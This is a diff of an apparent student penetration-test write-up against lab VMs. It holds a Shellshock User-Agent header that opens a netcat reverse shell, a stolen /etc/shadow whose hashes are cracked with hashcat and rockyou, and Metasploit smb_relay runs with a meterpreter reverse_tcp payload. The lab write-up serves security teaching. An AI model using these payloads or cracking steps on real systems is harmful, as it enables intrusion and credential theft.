@@ -98,6 +98,12 @@ Server: lighttpd/1.4.26
 
 This leads to no change, however, increasing the colons in [::1] to more than 7 will cause Internal Server Error. This is documented [here](http://redmine.lighttpd.net/projects/lighttpd/repository/revisions/2959/diff/) on line 47 in requests.c
 
+#### Shellshock
+I believe these VMs were created before shellshock was discovered / patched, or it may have slipped the authors mind. I **think** I managed to get a remote code execution running using `wget` with the header ` User-Agent: () { :; }; /bin/bash -c "nc 192.168.248.132 6666 -e /bin/bash -i"` although this should not be possible, unless the default index page which we still do not know the name of is a `cgi-bin` script, and it might be. 
+
+The VM suddenly started pinging me relentlessly and has been doing so for hours, but I cannot seem to get a reverse TCP shell with netcat going.
+
+
 #### ARP Spoof & TELNET hijack approach
 
 Using Wireshark I saw there was a TELNET connection going to an IP that did not exist on the network. I decided to ARPSPOOF and pretend I was this IP, and then listen for TELNET connection: And I got a connection!
@@ -115,10 +121,122 @@ I continued with logging into telnet, realizing John is stupid as fuck and sends
 ![PWND](pwnd.png)
 
 
-#### Shellshock
-I believe these VMs were created before shellshock was discovered / patched, or it may have slipped the authors mind. I **think** I managed to get a remote code execution running using `wget` with the header ` User-Agent: () { :; }; /bin/bash -c "nc 192.168.248.132 6666 -e /bin/bash -i"` although this should not be possible, unless the default index page which we still do not know the name of is a `cgi-bin` script, and it might be. 
+#### Looting
 
-The VM suddenly started pinging me relentlessly and has been doing so for hours, but I cannot seem to get a reverse TCP shell with netcat going.
+Having compromised this box, I thought I'd check what interesting things we can get from it. Perhaps, if we're lucky, there's something useful here. I decided to steal the `/etc/shadow` file with passwords for further investigation, and got 3 interesting ones:
+
+```
+root:$6$x9LyUphj$3cQTGIb269GBNuKc6GER29W9Ht7NmHjMRlyeR35oTTqngQHVD4gupwzSmjhAYOc6KEyfGQ32De27SgOCNzKcE.:16371:0:99999:7:::
+
+...
+
+jane:$1$a0rCbP9/$1FKr5sobP4rQHxuTA/l/p.:16346:0:99999:7:::
+telnetd:*:16346:0:99999:7:::
+john:$6$4xE5VNT4$Vb0nrZ64DGZvWmEy9sUKkCaS9O5lb50WlzSIxim6ydaCVfzWJrmLuwZIPxjgw1ZDIeQB9C9jX7qb7AtiDibjo0:16346:0:99999:7:::
+user:$6$Jp01V0lm$RX7eMjNIIoCnazLNEtSAe5Uq.nQINXMOpEggvRtTEV63QEMUEpmwFMJhYzQtLT/M33Kbl5Mhr59tPJbvN/u4k1:16346:0:99999:7:::
+```
+Removed the uninteresting stuff for brevity. Well, here we got some interesting stuff -- we have `user`, `john` and `jane`. First of all, we already know John's password. So what about Jane and User then?
+
+At first glance these look like regular unix SHA512 hashes -- at least John and User. But Jane's is different. 
+
+Let's verify that. After saving Jane's password to `jane.wtf`, I ran *hashid* to get more information:
+
+```
+[root@battlestation cudaHashcat-1.31]# hashid -f jane.wtf
+Analyzing '/home/amnesthesia/cudaHashcat-1.31/jane.hash'
+Hashes analyzed: 1
+Hashes found: 1
+Output written: '/home/amnesthesia/cudaHashcat-1.31/hashid_output.txt'
+[root@battlestation cudaHashcat-1.31]# cat hashid_output.txt 
+Analyzing '$1$a0rCbP9/$1FKr5sobP4rQHxuTA/l/p.'
+[+] MD5 Crypt
+[+] Cisco-IOS(MD5)
+[+] FreeBSD MD5
+
+``` 
+
+Looks like Jane is an MD5 Crypt hash, so let's just check User's to be sure then.
+
+```
+[root@battlestation cudaHashcat-1.31]# hashid -f user.wtf
+Analyzing '/home/amnesthesia/Downloads/cudaHashcat/cudaHashcat-1.31/user.wtf'
+Hashes analyzed: 1
+Hashes found: 1
+Output written: '/home/amnesthesia/Downloads/cudaHashcat/cudaHashcat-1.31/hashid_output.txt'
+
+[root@battlestation cudaHashcat-1.31]# cat hashid_output.txt 
+Analyzing '$6$Jp01V0lm$RX7eMjNIIoCnazLNEtSAe5Uq.nQINXMOpEggvRtTEV63QEMUEpmwFMJhYzQtLT/M33Kbl5Mhr59tPJbvN/u4k1'
+[+] SHA-512 Crypt
+
+```
+
+Alright, so we have one MD5Crypt and one SHA512. Looks like we're gonna have to crack these passwords, and since I have an nVidia card I use cuda, and thus cudaHashcat.
+
+##### Cracking Jane
+After firing up cudaHashcat, and setting the attack mode to Straight with the 500 id representing an MD5Crypto hash, I pointed it to use the `rockyou.txt` wordlist because why not -- we might be lucky!
+```
+[root@battlestation cudaHashcat-1.31]# ./cudaHashcat64.bin -a 0 -m 500 /home/amnesthesia/Documents/Assignments/EthicalHacking/EHAPT-Group-Project/hash /home/amnesthesia/Wordlists/rockyou.txt 
+cudaHashcat v1.31 starting...
+
+WARNING: Hashfile '/home/amnesthesia/Documents/Assignments/EthicalHacking/EHAPT-Group-Project/hash' in line 2 ($6$4xE5VNT4$Vb0nrZ64DGZvWmEy9sUKkCaS9O5lb50WlzSIxim6ydaCVfzWJrmLuwZIPxjgw1ZDIeQB9C9jX7qb7AtiDibjo0): Signature unmatched
+WARNING: Hashfile '/home/amnesthesia/Documents/Assignments/EthicalHacking/EHAPT-Group-Project/hash' in line 3 ($6$Jp01V0lm$RX7eMjNIIoCnazLNEtSAe5Uq.nQINXMOpEggvRtTEV63QEMUEpmwFMJhYzQtLT/M33Kbl5Mhr59tPJbvN/u4k1): Signature unmatched
+Device #1: GeForce GTX 570, 1279MB, 1500Mhz, 15MCU
+Device #1: WARNING! Kernel exec timeout is not disabled, it might cause you errors of code 702
+
+Hashes: 1 hashes; 1 unique digests, 1 unique salts
+Bitmaps: 8 bits, 256 entries, 0x000000ff mask, 1024 bytes
+Rules: 1
+Applicable Optimizers:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+Watchdog: Temperature abort trigger set to 90c
+Watchdog: Temperature retain trigger set to 80c
+Device #1: Kernel ./kernels/4318/m00500.sm_20.64.ptx
+Device #1: Kernel ./kernels/4318/bzero.64.ptx
+
+Cache-hit dictionary stats /home/amnesthesia/Wordlists/rockyou.txt: 139921497 bytes, 14343296 words, 14343296 keyspace
+
+$1$a0rCbP9/$1FKr5sobP4rQHxuTA/l/p.:pissoff
+```
+
+**AND WE WERE!**
+
+##### Cracking User
+
+Let's try the same on User, but with SHA512 of course.
+
+```
+[root@battlestation cudaHashcat-1.31]# ./cudaHashcat64.bin -a 0 -m 1800 /home/amnesthesia/Documents/Assignments/EthicalHacking/EHAPT-Group-Project/hash /home/amnesthesia/Wordlists/rockyou.txt 
+cudaHashcat v1.31 starting...
+
+WARNING: Hashfile '/home/amnesthesia/Documents/Assignments/EthicalHacking/EHAPT-Group-Project/hash' in line 1 ($1$a0rCbP9/$1FKr5sobP4rQHxuTA/l/p.): Signature unmatched
+Device #1: GeForce GTX 570, 1279MB, 1500Mhz, 15MCU
+Device #1: WARNING! Kernel exec timeout is not disabled, it might cause you errors of code 702
+
+Hashes: 2 hashes; 2 unique digests, 2 unique salts
+Bitmaps: 8 bits, 256 entries, 0x000000ff mask, 1024 bytes
+Rules: 1
+Applicable Optimizers:
+* Zero-Byte
+Watchdog: Temperature abort trigger set to 90c
+Watchdog: Temperature retain trigger set to 80c
+Device #1: Kernel ./kernels/4318/m01800.sm_20.64.ptx
+Device #1: Kernel ./kernels/4318/bzero.64.ptx
+
+Cache-hit dictionary stats /home/amnesthesia/Wordlists/rockyou.txt: 139921497 bytes, 14343296 words, 14343296 keyspace
+
+$6$Jp01V0lm$RX7eMjNIIoCnazLNEtSAe5Uq.nQINXMOpEggvRtTEV63QEMUEpmwFMJhYzQtLT/M33Kbl5Mhr59tPJbvN/u4k1:summer
+
+```
+
+There we have them.
+
+Password for User is **summer**
+
+Password for Jane is **pissoff**
+
+Very fitting, as October means summer is pissing off ;)
 
 # Windows Vista Business (build 6000)
 
@@ -147,6 +265,188 @@ The only vulnerability with a **High** rating is the SMB one. We don't want Deni
 
 Even though it's Vista, I think this machine may be a decoy and not vulnerable without user interaction. Several exploits seem to exist for Vista SP1, ironically, and I have tried them all. This Vista is not patched it seems, and the exploits available require user interaction.
 
+
+### Following up on the SMB trail
+
+Alright, first of all ... Let's see what info we can get about this system.
+
+```
+msf > use auxiliary/scanner/smb/smb_version
+msf auxiliary(smb_version) > set RHOSTS 192.168.248.131
+msf auxiliary(smb_version) > show options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS     192.168.248.131  yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+msf auxiliary(smb_version) > run
+
+[*] 192.168.248.131:445 is running Windows Vista Business (Build 6000) (language: Unknown) (name:LH-0XZPOTYEAFVA) (domain:WORKGROUP)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+
+Well, damn. This much we already knew ... 
+
+Using `nbtscan`, I tried to see what was on the Windows SMB
+
+```
+root@battlestation:~# nbtscan -v 192.168.248.131
+Doing NBT name scan for addresses from 192.168.248.131
+
+
+NetBIOS Name Table for Host 192.168.248.131:
+
+Incomplete packet, 209 bytes long.
+Name             Service          Type             
+----------------------------------------
+LH-0XZPOTYEAFVA  <00>             UNIQUE
+WORKGROUP        <00>              GROUP
+LH-0XZPOTYEAFVA  <20>             UNIQUE
+WORKGROUP        <1e>              GROUP
+WORKGROUP        <1d>             UNIQUE
+__MSBROWSE__     <01>              GROUP
+
+Adapter address: 00:0c:29:12:ba:de
+----------------------------------------
+
+```
+
+I also, rather blindly, attempted to use an otherwise rather good RCE in `smb_relay` using Metasploit, and proceeded with:
+
+```
+msf> use exploit/windows/smb/smb_relay
+msf exploit(smb_relay) > set payload windows/meterpreter/reverse_tcp
+msf exploit(smb_relay) > set SMBHOST 192.168.248.131
+msf exploit(smb_relay) > set SRVPORT 6969
+msf exploit(smb_relay) > set LHOST 192.168.248.132
+msf exploit(smb_relay) > set LPORT 7070
+msf exploit(smb_relay) > show options
+
+Module options (exploit/windows/smb/smb_relay):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SHARE       ADMIN$           yes       The share to connect to
+   SMBHOST     192.168.248.131  no        The target SMB server (leave empty for originating system)
+   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT     6969             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
+   LHOST     192.168.248.132  yes       The listen address
+   LPORT     7070             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf exploit(smb_relay) > exploit
+[*] Exploit running as background job.
+
+[*] Started reverse handler on 192.168.248.132:6868 
+[*] Server started.
+msf exploit(smb_relay) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+```
+
+Seems I got nothing ... So I decided to change the share to one of the shares I found in the earlier step:
+
+```
+msf exploit(smb_relay) > jobs -K
+msf exploit(smb_relay) > set SHARE LH-0XZPOTYEAFVA
+SHARE => LH-0XZPOTYEAFVA
+msf exploit(smb_relay) > exploit
+[*] Exploit running as background job.
+
+[*] Started reverse handler on 192.168.248.132:7070 
+msf exploit(smb_relay) > [*] Server started.
+
+msf exploit(smb_relay) > jobs
+
+Jobs
+====
+
+  Id  Name
+  --  ----
+  2   Exploit: windows/smb/smb_relay
+
+msf exploit(smb_relay) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+```
+
+Still, nothing :( Hmm ... Maybe I just misinterpreted the output of `nbtscan`? It's probably not share names but group/domain names. I'll try to smb_enumshares and see what we can get?
+
+```
+msf > use auxiliary/scanner/smb/smb_enumshares
+msf auxiliary(smb_enumshares) > show options
+
+Module options (auxiliary/scanner/smb/smb_enumshares):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   LogSpider        3                no        0 = disabled, 1 = CSV, 2 = table (txt), 3 = one liner (txt) (accepted: 0, 1, 2, 3)
+   MaxDepth         999              yes       Max number of subdirectories to spider
+   RHOSTS                            yes       The target address range or CIDR identifier
+   SMBDomain        WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                           no        The password for the specified username
+   SMBUser                           no        The username to authenticate as
+   ShowFiles        false            yes       Show detailed information when spidering
+   SpiderProfiles   true             no        Spider only user profiles when share = C$
+   SpiderShares     false            no        Spider shares recursively
+   THREADS          1                yes       The number of concurrent threads
+   USE_SRVSVC_ONLY  false            yes       List shares only with SRVSVC
+
+msf auxiliary(smb_enumshares) > set RHOSTS 192.168.248.131
+RHOSTS => 192.168.248.131
+msf auxiliary(smb_enumshares) > set THREADS 20
+THREADS => 20
+msf auxiliary(smb_enumshares) > run
+
+[-] 192.168.248.131:139 - Login Failed: The SMB server did not reply to our request
+[*] 192.168.248.131:445 - Windows Vista Business (Build 6000) (Unknown)
+[*] 192.168.248.131:445 - No shares collected
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(smb_enumshares) > set SMBDomain __MSBROWSE__
+SMBDomain => __MSBROWSE__
+msf auxiliary(smb_enumshares) > run
+
+[-] 192.168.248.131:139 - Login Failed: The SMB server did not reply to our request
+[*] 192.168.248.131:445 - Windows Vista Business (Build 6000) (Unknown)
+[*] 192.168.248.131:445 - No shares collected
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Seems like no matter what I do, the SMB server won't respond.
 
 # Scan Results (OpenVAS)
 
